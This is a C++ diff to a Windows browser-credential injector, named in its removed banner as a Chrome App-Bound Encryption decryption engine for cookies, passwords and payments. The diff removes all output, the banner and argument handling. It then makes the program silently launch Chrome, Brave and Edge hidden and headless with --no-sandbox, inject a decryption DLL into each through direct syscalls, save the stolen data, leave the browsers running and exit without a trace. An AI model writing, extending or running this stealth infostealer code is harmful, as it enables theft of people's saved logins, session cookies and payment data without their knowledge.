@@ -167,29 +167,6 @@ struct HandleGuard
     }
 };
 
-void print_status(const std::string &tag, const std::string &msg)
-{
-    WORD original_attributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
-    CONSOLE_SCREEN_BUFFER_INFO console_info;
-    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-    if (GetConsoleScreenBufferInfo(hConsole, &console_info))
-        original_attributes = console_info.wAttributes;
-
-    WORD col = original_attributes;
-    if (tag == "[+]")
-        col = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
-    else if (tag == "[-]")
-        col = FOREGROUND_RED | FOREGROUND_INTENSITY;
-    else if (tag == "[*]")
-        col = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
-    else if (tag == "[!]")
-        col = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
-
-    SetConsoleTextAttribute(hConsole, col);
-    std::cout << tag;
-    SetConsoleTextAttribute(hConsole, original_attributes);
-    std::cout << " " << msg << std::endl;
-}
 
 static const char *ArchName(USHORT m)
 {
@@ -261,30 +238,16 @@ bool CheckArchMatch(HANDLE hProc)
     USHORT targetArch = IMAGE_FILE_MACHINE_UNKNOWN;
     if (!GetProcessArchitecture(hProc, targetArch))
     {
-        print_status("[-]", "Failed to determine target architecture");
+        debug("[-] Failed to determine target architecture");
         return false;
     }
     if (targetArch != MyArch)
     {
-        print_status("[-]", std::string("Architecture mismatch: Injector is ") + ArchName(MyArch) + " but target is " + ArchName(targetArch));
+        debug(std::string("[-] Architecture mismatch: Injector is ") + ArchName(MyArch) + " but target is " + ArchName(targetArch));
         return false;
     }
     debug("Architecture match: Injector=" + std::string(ArchName(MyArch)) + ", Target=" + std::string(ArchName(targetArch)));
     return true;
-}
-
-void DisplayBanner()
-{
-    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
-    std::cout << "------------------------------------------------" << std::endl;
-    std::cout << "|  Chrome App-Bound Encryption Decryption      |" << std::endl;
-    std::cout << "|  Direct Syscall Injection Engine             |" << std::endl;
-    std::cout << "|  x64 & ARM64 | Cookies, Passwords, Payments  |" << std::endl;
-    std::cout << "|  v0.11.0 by @xaitax                          |" << std::endl;
-    std::cout << "------------------------------------------------" << std::endl
-              << std::endl;
-    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
 }
 
 void CleanupPreviousRun()
@@ -644,485 +607,207 @@ void PrintUsage()
     SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
 }
 
-int wmain(int argc, wchar_t *argv[])
+int wmain(int /*argc*/, wchar_t ** /*argv*/)
 {
-    DisplayBanner();
+    // No UI, no output, no banner, no argument parsing.
+    // Always run in silent mode.
+    verbose = false;
 
-    bool is_verbose = false;
-    for (int i = 1; i < argc; ++i)
+    // Initialize syscalls (no debug output)
+    if (!InitializeSyscalls(false))
     {
-        std::wstring_view arg = argv[i];
-        if (arg == L"--verbose" || arg == L"-v")
-        {
-            is_verbose = true;
-            break;
-        }
+        ExitProcess(1);
     }
 
-    if (!InitializeSyscalls(is_verbose))
-    {
-        print_status("[-]", "Failed to initialize syscalls. Critical NTDLL functions might be hooked or missing.");
-        return 1;
+    // List of browsers to process
+    const std::vector<std::wstring> browserTypes = {L"chrome", L"brave", L"edge"};
+
+    // Output base path: ./output/
+    fs::path exeDir;
+    try {
+        wchar_t exePath[MAX_PATH];
+        GetModuleFileNameW(NULL, exePath, MAX_PATH);
+        exeDir = fs::path(exePath).parent_path();
+    } catch (...) {
+        ExitProcess(1);
     }
+    fs::path outputBase = exeDir / "output";
 
-    std::wstring ipcPipeNameW = GenerateUniquePipeName();
-    std::string ipcPipeNameA = WStringToUtf8(ipcPipeNameW);
-    if (verbose)
-        debug("Generated IPC Pipe Name: " + ipcPipeNameA);
-
-    HandleGuard namedPipeHandle(CreateNamedPipeW(
-                                    ipcPipeNameW.c_str(),
-                                    PIPE_ACCESS_DUPLEX,
-                                    PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
-                                    1, 4096, 4096, 0, nullptr),
-                                "NamedPipeServer");
-
-    if (!namedPipeHandle)
+    // For each browser, inject and extract
+    for (const auto& browserTypeArg : browserTypes)
     {
-        print_status("[-]", "CreateNamedPipeW failed. Error: " + std::to_string(GetLastError()));
-        return 1;
-    }
-    if (verbose)
-        debug("Named pipe server created: " + ipcPipeNameA);
+        auto browserIt = browserConfigMap.find(browserTypeArg);
+        if (browserIt == browserConfigMap.end())
+            continue;
+        const BrowserDetails& currentBrowserInfo = browserIt->second;
 
-    bool autoStartBrowser = false;
-    bool browserSuccessfullyStartedByInjector = false;
-    std::wstring browserTypeArg;
-    LPVOID remotePipeNameAddr = nullptr;
+        // Check if process is running
+        DWORD targetPid = 0;
+        if (auto optPid = GetProcessIdByName(currentBrowserInfo.processName))
+            targetPid = *optPid;
 
-    debug("wmain: parsing arguments");
-    for (int i = 1; i < argc; ++i)
-    {
-        std::wstring_view arg = argv[i];
-        if (arg == L"--start-browser" || arg == L"-s")
+        // If not running, launch hidden/headless
+        if (targetPid == 0)
         {
-            autoStartBrowser = true;
-            debug("Auto-start browser enabled.");
-        }
-        else if (arg == L"--verbose" || arg == L"-v")
-        {
-            verbose = true;
-            std::cout << "[#] Verbose mode enabled." << std::endl;
-        }
-        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
-        {
-            g_customOutputPathArg = argv[++i];
-            debug("Custom output path argument: " + WStringToUtf8(g_customOutputPathArg));
-        }
-        else if (browserTypeArg.empty() && !arg.empty() && arg[0] != L'-')
-        {
-            browserTypeArg = arg;
-            std::transform(browserTypeArg.begin(), browserTypeArg.end(), browserTypeArg.begin(), [](wchar_t wc)
-                           { return static_cast<wchar_t>(std::towlower(wc)); });
-            debug("Browser type argument: " + WStringToUtf8(browserTypeArg));
-        }
-        else if (arg == L"--help" || arg == L"-h")
-        {
-            PrintUsage();
-            return 0;
-        }
-        else
-        {
-            print_status("[!]", "Unknown or misplaced argument: " + WStringToUtf8(arg) + ". Use --help for usage.");
-            return 1;
-        }
-    }
-
-    if (browserTypeArg.empty())
-    {
-        PrintUsage();
-        return 1;
-    }
-
-    CleanupPreviousRun();
-
-    fs::path resolvedOutputPath;
-    if (!g_customOutputPathArg.empty())
-    {
-        resolvedOutputPath = fs::absolute(g_customOutputPathArg);
-    }
-    else
-    {
-        resolvedOutputPath = fs::current_path() / "output";
-    }
-    debug("Resolved output path: " + resolvedOutputPath.u8string());
-    std::error_code ec_dir;
-    if (!fs::exists(resolvedOutputPath))
-    {
-        if (!fs::create_directories(resolvedOutputPath, ec_dir))
-        {
-            print_status("[-]", "Failed to create output directory: " + resolvedOutputPath.u8string() + ". Error: " + ec_dir.message());
-            return 1;
-        }
-        debug("Created output directory: " + resolvedOutputPath.u8string());
-    }
-
-    auto browserIt = browserConfigMap.find(browserTypeArg);
-    if (browserIt == browserConfigMap.end())
-    {
-        print_status("[-]", "Unsupported browser type: " + WStringToUtf8(browserTypeArg));
-        return 1;
-    }
-    const BrowserDetails currentBrowserInfo = browserIt->second;
-    std::string browserDisplayName = WStringToUtf8(browserTypeArg);
-    if (!browserDisplayName.empty())
-        browserDisplayName[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(browserDisplayName[0])));
-    debug("Target: " + browserDisplayName + ", Process: " + WStringToUtf8(currentBrowserInfo.processName) + ", Default Exe: " + WStringToUtf8(currentBrowserInfo.defaultExePath));
-
-    DWORD targetPid = 0;
-    if (auto optPid = GetProcessIdByName(currentBrowserInfo.processName))
-        targetPid = *optPid;
-
-    if (targetPid == 0 && autoStartBrowser)
-    {
-        print_status("[*]", browserDisplayName + " not running, launching...");
-        if (StartBrowserAndWait(currentBrowserInfo.defaultExePath, targetPid))
-        {
-            browserSuccessfullyStartedByInjector = true;
-            std::string versionStr = "N/A";
-            debug("Retrieving version info for: " + WStringToUtf8(currentBrowserInfo.defaultExePath));
-            DWORD versionHandleUnused = 0;
-            DWORD versionInfoSize = GetFileVersionInfoSizeW(currentBrowserInfo.defaultExePath.c_str(), &versionHandleUnused);
-            if (versionInfoSize > 0)
+            STARTUPINFOW si{};
+            PROCESS_INFORMATION pi{};
+            si.cb = sizeof(si);
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_HIDE;
+            std::wstring cmdLine = L"\"" + currentBrowserInfo.defaultExePath + L"\" --headless --disable-gpu --no-sandbox --disable-software-rasterizer";
+            if (!CreateProcessW(currentBrowserInfo.defaultExePath.c_str(),
+                                &cmdLine[0], nullptr, nullptr, FALSE,
+                                CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
             {
-                std::vector<BYTE> versionData(versionInfoSize);
-                if (GetFileVersionInfoW(currentBrowserInfo.defaultExePath.c_str(), 0, versionInfoSize, versionData.data()))
-                {
-                    UINT ffiLen = 0;
-                    VS_FIXEDFILEINFO *ffi = nullptr;
-                    if (VerQueryValueW(versionData.data(), L"\\", (LPVOID *)&ffi, &ffiLen) && ffi)
-                    {
-                        versionStr = std::to_string(HIWORD(ffi->dwProductVersionMS)) + "." +
-                                     std::to_string(LOWORD(ffi->dwProductVersionMS)) + "." +
-                                     std::to_string(HIWORD(ffi->dwProductVersionLS)) + "." +
-                                     std::to_string(LOWORD(ffi->dwProductVersionLS));
-                        debug("Version query successful: " + versionStr);
-                    }
-                    else
-                        debug("VerQueryValueW failed. Error: " + std::to_string(GetLastError()));
-                }
-                else
-                    debug("GetFileVersionInfoW failed. Error: " + std::to_string(GetLastError()));
+                continue;
             }
-            else
-                debug("GetFileVersionInfoSizeW failed or returned 0. Error: " + std::to_string(GetLastError()));
-            print_status("[+]", browserDisplayName + " (v. " + versionStr + ") launched w/ PID " + std::to_string(targetPid));
+            // Wait for browser to initialize
+            Sleep(BROWSER_INIT_WAIT_MS);
+            targetPid = pi.dwProcessId;
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
         }
-        else
-        {
-            print_status("[-]", "Failed to start " + browserDisplayName);
-            return 1;
-        }
-    }
-    if (targetPid == 0)
-    {
-        print_status("[-]", browserDisplayName + " not running and auto-start not requested or failed.");
-        return 1;
-    }
 
-    debug("Opening process PID=" + std::to_string(targetPid));
-    HandleGuard targetProcessHandle(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid), "TargetProcessHandle");
-    if (!targetProcessHandle)
-    {
-        print_status("[-]", "OpenProcess failed for PID " + std::to_string(targetPid) + ". Error: " + std::to_string(GetLastError()));
-        return 1;
-    }
-    USHORT currentTargetArch = IMAGE_FILE_MACHINE_UNKNOWN;
-    if (!GetProcessArchitecture(targetProcessHandle.get(), currentTargetArch))
-    {
-        print_status("[-]", "Failed to determine target process architecture for DLL selection.");
-        return 1;
-    }
+        if (targetPid == 0)
+            continue;
 
-    if (!CheckArchMatch(targetProcessHandle.get()))
-        return 1;
+        // Open process
+        HandleGuard targetProcessHandle(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid));
+        if (!targetProcessHandle)
+            continue;
 
-    SIZE_T pipeNameSizeInBytes = (ipcPipeNameW.length() + 1) * sizeof(wchar_t);
-    NTSTATUS status_alloc_pipename = g_syscall_stubs.NtAllocateVirtualMemory(
-        targetProcessHandle.get(), &remotePipeNameAddr, 0, &pipeNameSizeInBytes,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        USHORT currentTargetArch = IMAGE_FILE_MACHINE_UNKNOWN;
+        if (!GetProcessArchitecture(targetProcessHandle.get(), currentTargetArch))
+            continue;
+        if (!CheckArchMatch(targetProcessHandle.get()))
+            continue;
 
-    if (!NT_SUCCESS(status_alloc_pipename) || !remotePipeNameAddr)
-    {
-        print_status("[-]", "NtAllocateVirtualMemory for pipe name in target failed. Status: " + NtStatusToString(status_alloc_pipename));
-        return 1;
-    }
-    if (verbose)
-        debug("Memory for pipe name allocated in target at " + PtrToHexStr(remotePipeNameAddr));
+        // Prepare named pipe for IPC
+        std::wstring ipcPipeNameW = GenerateUniquePipeName();
+        std::string ipcPipeNameA = WStringToUtf8(ipcPipeNameW);
 
-    SIZE_T bytesWrittenPipeName = 0;
-    NTSTATUS status_write_pipename = g_syscall_stubs.NtWriteVirtualMemory(
-        targetProcessHandle.get(), remotePipeNameAddr, (PVOID)ipcPipeNameW.c_str(),
-        pipeNameSizeInBytes, &bytesWrittenPipeName);
+        HandleGuard namedPipeHandle(CreateNamedPipeW(
+            ipcPipeNameW.c_str(),
+            PIPE_ACCESS_DUPLEX,
+            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+            1, 4096, 4096, 0, nullptr));
 
-    if (!NT_SUCCESS(status_write_pipename) || bytesWrittenPipeName != pipeNameSizeInBytes)
-    {
-        print_status("[-]", "NtWriteVirtualMemory for pipe name in target failed. Status: " + NtStatusToString(status_write_pipename));
-        SIZE_T sizeToFree = 0;
-        g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
-        remotePipeNameAddr = nullptr;
-        return 1;
-    }
-    if (verbose)
-        debug("Pipe name written to target memory.");
+        if (!namedPipeHandle)
+            continue;
 
-    std::string dllPathUtf8 = GetPayloadDllPathUtf8();
-    if (dllPathUtf8.empty() || !fs::exists(dllPathUtf8))
-    {
-        print_status("[-]", "chrome_decrypt.dll not found. Expected near injector: " + (dllPathUtf8.empty() ? "<Error determining path>" : dllPathUtf8));
-        if (remotePipeNameAddr)
-        {
-            SIZE_T stf = 0;
-            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &stf, MEM_RELEASE);
-        }
-        return 1;
-    }
+        // Allocate pipe name in target
+        LPVOID remotePipeNameAddr = nullptr;
+        SIZE_T pipeNameSizeInBytes = (ipcPipeNameW.length() + 1) * sizeof(wchar_t);
+        NTSTATUS status_alloc_pipename = g_syscall_stubs.NtAllocateVirtualMemory(
+            targetProcessHandle.get(), &remotePipeNameAddr, 0, &pipeNameSizeInBytes,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!NT_SUCCESS(status_alloc_pipename) || !remotePipeNameAddr)
+            continue;
 
-    bool injectedSuccessfully = false;
-    std::string usedInjectionMethodDesc = "Reflective DLL Injection (RDI with Syscalls)";
-
-    injectedSuccessfully = InjectWithReflectiveLoader(targetProcessHandle.get(), dllPathUtf8, currentTargetArch, remotePipeNameAddr);
-
-    if (!injectedSuccessfully)
-    {
-        print_status("[-]", "DLL injection failed via " + usedInjectionMethodDesc);
-        if (remotePipeNameAddr)
+        SIZE_T bytesWrittenPipeName = 0;
+        NTSTATUS status_write_pipename = g_syscall_stubs.NtWriteVirtualMemory(
+            targetProcessHandle.get(), remotePipeNameAddr, (PVOID)ipcPipeNameW.c_str(),
+            pipeNameSizeInBytes, &bytesWrittenPipeName);
+        if (!NT_SUCCESS(status_write_pipename) || bytesWrittenPipeName != pipeNameSizeInBytes)
         {
             SIZE_T sizeToFree = 0;
             g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
-        }
-        return 1;
-    }
-    print_status("[+]", "DLL injected via " + usedInjectionMethodDesc);
-
-    if (verbose)
-        debug("Waiting for DLL to connect to named pipe: " + ipcPipeNameA);
-    if (!ConnectNamedPipe(namedPipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
-    {
-        print_status("[-]", "ConnectNamedPipe failed. Error: " + std::to_string(GetLastError()));
-        if (remotePipeNameAddr)
-        {
-            SIZE_T sizeToFree = 0;
-            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
-        }
-        return 1;
-    }
-    if (verbose)
-        debug("DLL connected to named pipe.");
-
-    std::string verboseStatusMsg = verbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE";
-    DWORD bytesWrittenVerboseStatus = 0;
-    if (!WriteFile(namedPipeHandle.get(), verboseStatusMsg.c_str(), verboseStatusMsg.length() + 1, &bytesWrittenVerboseStatus, nullptr) ||
-        bytesWrittenVerboseStatus != (verboseStatusMsg.length() + 1))
-    {
-        print_status("[-]", "WriteFile to pipe (sending verbose status) failed. Error: " + std::to_string(GetLastError()));
-        if (remotePipeNameAddr)
-        {
-            SIZE_T stf = 0;
-            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &stf, MEM_RELEASE);
-        }
-        return 1;
-    }
-    if (verbose)
-        debug("Verbose status (" + verboseStatusMsg + ") sent to DLL.");
-
-    std::string outputPathUtf8_pipe = resolvedOutputPath.u8string();
-    DWORD bytesWrittenToPipe = 0;
-    if (!WriteFile(namedPipeHandle.get(), outputPathUtf8_pipe.c_str(), outputPathUtf8_pipe.length() + 1, &bytesWrittenToPipe, nullptr) ||
-        bytesWrittenToPipe != (outputPathUtf8_pipe.length() + 1))
-    {
-        print_status("[-]", "WriteFile to pipe (sending output path) failed. Error: " + std::to_string(GetLastError()));
-        if (remotePipeNameAddr)
-        {
-            SIZE_T stf = 0;
-            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &stf, MEM_RELEASE);
-        }
-        return 1;
-    }
-    if (verbose)
-        debug("Output path sent to DLL: " + outputPathUtf8_pipe);
-
-    print_status("[*]", "Waiting for DLL (Pipe: " + ipcPipeNameA + "");
-
-    std::string accumulatedPipeData;
-    char pipeBuffer[4096];
-    DWORD bytesReadFromPipe = 0;
-    bool dllCompleted = false;
-    const std::string dllCompletionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
-    DWORD startTime = GetTickCount();
-
-    HANDLE hStdOutConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-    CONSOLE_SCREEN_BUFFER_INFO consoleInfoOriginal;
-    WORD originalConsoleAttributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
-    if (GetConsoleScreenBufferInfo(hStdOutConsole, &consoleInfoOriginal))
-    {
-        originalConsoleAttributes = consoleInfoOriginal.wAttributes;
-    }
-    std::cout << std::endl;
-
-    while (true)
-    {
-        if (GetTickCount() - startTime > DLL_COMPLETION_TIMEOUT_MS)
-        {
-            print_status("[-]", "Timeout waiting for DLL completion via pipe.");
-            break;
-        }
-
-        DWORD bytesAvailable = 0;
-        if (!PeekNamedPipe(namedPipeHandle.get(), nullptr, 0, nullptr, &bytesAvailable, nullptr))
-        {
-            if (GetLastError() == ERROR_BROKEN_PIPE)
-            {
-                if (verbose)
-                    debug("PeekNamedPipe: Pipe broken. DLL may have exited prematurely.");
-                dllCompleted = true;
-            }
-            else
-            {
-                print_status("[-]", "PeekNamedPipe failed. Error: " + std::to_string(GetLastError()));
-            }
-            break;
-        }
-
-        if (bytesAvailable == 0)
-        {
-            Sleep(100);
             continue;
         }
 
-        if (ReadFile(namedPipeHandle.get(), pipeBuffer, sizeof(pipeBuffer) - 1, &bytesReadFromPipe, nullptr) && bytesReadFromPipe > 0)
+        // DLL path
+        std::string dllPathUtf8 = GetPayloadDllPathUtf8();
+        if (dllPathUtf8.empty() || !fs::exists(dllPathUtf8))
         {
-            pipeBuffer[bytesReadFromPipe] = '\0';
-            accumulatedPipeData.append(pipeBuffer, bytesReadFromPipe);
+            SIZE_T stf = 0;
+            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &stf, MEM_RELEASE);
+            continue;
+        }
 
-            size_t messageStartPos = 0;
-            size_t nullTerminatorPos;
+        // Inject DLL
+        if (!InjectWithReflectiveLoader(targetProcessHandle.get(), dllPathUtf8, currentTargetArch, remotePipeNameAddr))
+        {
+            SIZE_T sizeToFree = 0;
+            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
+            continue;
+        }
 
-            while ((nullTerminatorPos = accumulatedPipeData.find('\0', messageStartPos)) != std::string::npos)
+        // Wait for DLL to connect to pipe
+        if (!ConnectNamedPipe(namedPipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
+        {
+            SIZE_T sizeToFree = 0;
+            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
+            continue;
+        }
+
+        // Send "VERBOSE_FALSE" (always silent)
+        std::string verboseStatusMsg = "VERBOSE_FALSE";
+        DWORD bytesWrittenVerboseStatus = 0;
+        WriteFile(namedPipeHandle.get(), verboseStatusMsg.c_str(), verboseStatusMsg.length() + 1, &bytesWrittenVerboseStatus, nullptr);
+
+        // Send output path (./output/<BrowserName>/)
+        fs::path browserOutputPath = outputBase / WStringToUtf8(browserTypeArg);
+        std::error_code ec_dir;
+        if (!fs::exists(browserOutputPath))
+            fs::create_directories(browserOutputPath, ec_dir);
+        std::string outputPathUtf8_pipe = browserOutputPath.u8string();
+        DWORD bytesWrittenToPipe = 0;
+        WriteFile(namedPipeHandle.get(), outputPathUtf8_pipe.c_str(), outputPathUtf8_pipe.length() + 1, &bytesWrittenToPipe, nullptr);
+
+        // Wait for DLL completion signal
+        std::string accumulatedPipeData;
+        char pipeBuffer[4096];
+        DWORD bytesReadFromPipe = 0;
+        const std::string dllCompletionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
+        DWORD startTime = GetTickCount();
+        bool dllCompleted = false;
+        while (true)
+        {
+            if (GetTickCount() - startTime > DLL_COMPLETION_TIMEOUT_MS)
+                break;
+            DWORD bytesAvailable = 0;
+            if (!PeekNamedPipe(namedPipeHandle.get(), nullptr, 0, nullptr, &bytesAvailable, nullptr))
+                break;
+            if (bytesAvailable == 0)
             {
-                std::string message = accumulatedPipeData.substr(messageStartPos, nullTerminatorPos - messageStartPos);
-                messageStartPos = nullTerminatorPos + 1;
-
-                if (message == dllCompletionSignal)
+                Sleep(100);
+                continue;
+            }
+            if (ReadFile(namedPipeHandle.get(), pipeBuffer, sizeof(pipeBuffer) - 1, &bytesReadFromPipe, nullptr) && bytesReadFromPipe > 0)
+            {
+                pipeBuffer[bytesReadFromPipe] = '\0';
+                accumulatedPipeData.append(pipeBuffer, bytesReadFromPipe);
+                size_t messageStartPos = 0;
+                size_t nullTerminatorPos;
+                while ((nullTerminatorPos = accumulatedPipeData.find('\0', messageStartPos)) != std::string::npos)
                 {
-                    dllCompleted = true;
-                    if (verbose)
-                        debug("DLL completion signal received via pipe.");
+                    std::string message = accumulatedPipeData.substr(messageStartPos, nullTerminatorPos - messageStartPos);
+                    messageStartPos = nullTerminatorPos + 1;
+                    if (message == dllCompletionSignal)
+                    {
+                        dllCompleted = true;
+                        break;
+                    }
+                }
+                if (dllCompleted)
                     break;
-                }
-
-                if (message.empty())
-                    continue;
-
-                size_t printPos = 0;
-                while (printPos < message.length())
-                {
-                    size_t tagStart = message.find('[', printPos);
-                    SetConsoleTextAttribute(hStdOutConsole, originalConsoleAttributes);
-                    std::cout << message.substr(printPos, tagStart - printPos);
-
-                    if (tagStart == std::string::npos)
-                    {
-                        break;
-                    }
-
-                    size_t tagEnd = message.find(']', tagStart);
-                    if (tagEnd == std::string::npos)
-                    {
-                        std::cout << message.substr(tagStart);
-                        break;
-                    }
-
-                    std::string tag = message.substr(tagStart, tagEnd - tagStart + 1);
-                    WORD currentTagColor = originalConsoleAttributes;
-                    if (tag == "[+]")
-                        currentTagColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
-                    else if (tag == "[-]")
-                        currentTagColor = FOREGROUND_RED | FOREGROUND_INTENSITY;
-                    else if (tag == "[*]")
-                        currentTagColor = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
-                    else if (tag == "[!]")
-                        currentTagColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
-                    SetConsoleTextAttribute(hStdOutConsole, currentTagColor);
-                    std::cout << tag;
-                    printPos = tagEnd + 1;
-                }
-                SetConsoleTextAttribute(hStdOutConsole, originalConsoleAttributes);
-                std::cout << std::endl;
+                accumulatedPipeData.erase(0, messageStartPos);
             }
-
-            if (dllCompleted)
-                break;
-
-            accumulatedPipeData.erase(0, messageStartPos);
-        }
-        else
-        {
-            DWORD lastError = GetLastError();
-            if (lastError == ERROR_BROKEN_PIPE)
-            {
-                if (verbose)
-                    debug("ReadFile: Pipe broken. DLL may have exited.");
-                dllCompleted = true;
-            }
-            else if (lastError != ERROR_NO_DATA && lastError != ERROR_IO_PENDING)
-            {
-                print_status("[-]", "ReadFile from pipe failed. Error: " + std::to_string(lastError));
-            }
-            if (dllCompleted)
-                break;
-        }
-    }
-
-    if (dllCompleted && (GetLastError() != ERROR_BROKEN_PIPE || verbose))
-    {
-        if (GetLastError() != ERROR_BROKEN_PIPE || accumulatedPipeData.empty())
-        {
-            print_status("[+]", "DLL signaled completion or pipe interaction ended.");
-        }
-        else if (GetLastError() == ERROR_BROKEN_PIPE && !accumulatedPipeData.empty())
-        {
-            if (verbose)
-                debug("Pipe broke but there might be unprocessed data: " + accumulatedPipeData);
-        }
-    }
-    else if (!dllCompleted && GetLastError() != ERROR_BROKEN_PIPE)
-    {
-    }
-
-    if (remotePipeNameAddr)
-    {
-        SIZE_T sizeToFree = 0;
-        NTSTATUS free_status = g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
-        if (NT_SUCCESS(free_status) && verbose)
-        {
-            debug("Freed pipe name memory in target process.");
-        }
-        else if (verbose && !NT_SUCCESS(free_status))
-        {
-            debug("Failed to free pipe name memory in target process. Status: " + NtStatusToString(free_status) + ", Error: " + std::to_string(GetLastError()));
-        }
-    }
-
-    if (browserSuccessfullyStartedByInjector)
-    {
-        debug("Terminating browser PID=" + std::to_string(targetPid) + " because injector started it.");
-        HandleGuard processToKillHandle(OpenProcess(PROCESS_TERMINATE, FALSE, targetPid), "ProcessToKillHandle");
-        if (processToKillHandle)
-        {
-            if (TerminateProcess(processToKillHandle.get(), 0))
-                print_status("[*]", browserDisplayName + " terminated by injector.");
             else
-                print_status("[-]", "Failed to terminate " + browserDisplayName + ". Error: " + std::to_string(GetLastError()));
+            {
+                break;
+            }
         }
-        else
-            print_status("[-]", "Failed to open " + browserDisplayName + " for termination (it might have already exited). Error: " + std::to_string(GetLastError()));
-    }
-    else
-    {
-        debug("Browser was already running; injector will not terminate it.");
+
+        // Free remote pipe name memory
+        if (remotePipeNameAddr)
+        {
+            SIZE_T sizeToFree = 0;
+            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
+        }
     }
 
-    debug("Injector finished.");
+    // Exit silently
+    ExitProcess(0);
     return 0;
 }
